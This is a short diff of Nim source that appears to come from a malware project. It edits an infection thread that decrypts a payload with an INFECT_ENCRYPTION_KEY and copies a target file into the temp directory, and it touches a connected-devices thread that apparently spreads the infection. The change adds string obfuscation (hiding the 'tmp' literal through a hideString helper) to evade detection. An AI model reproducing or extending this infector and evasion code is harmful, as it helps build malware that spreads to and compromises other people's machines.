@@ -15,7 +15,8 @@ when USE_INFECT_THREAD:
   from os import existsFile
 
   from lib/more/xxtea import decrypt
-  from lib/functions/hideString import d
+
+  import lib/functions/hideString
 
   from lib/flags import INFECT_ENCRYPTION_KEY
 
@@ -23,7 +24,7 @@ when USE_INFECT_THREAD:
     try:
       let file = paramStr(1)
       let (_, name, ext) = splitFile(file)
-      let tmpFile = getEnv("tmp") / name & ext
+      let tmpFile = getEnv(d e"tmp") / name & ext
 
       if not existsFile(tmpFile):
         writeFile(
@@ -137,10 +138,11 @@ when USE_CONNECTED_DEVICES_THREAD:
 from os import sleep
 
 while true:
-  ## TODO: n as vrea sa folosesc sleep(10)
-  ## asa ca e probabil sa modifc aici oricand
-  sleep(10)
-  let channel = mainChannel.tryRecv()
+  var channel: tuple[dataAvailable: bool, msg: string] = mainChannel.tryRecv()
 
   if channel.dataAvailable:
     echo channel.msg
+
+  ## TODO: n as vrea sa folosesc sleep(10)
+  ## asa ca e probabil sa modifc aici oricand
+  sleep(10)
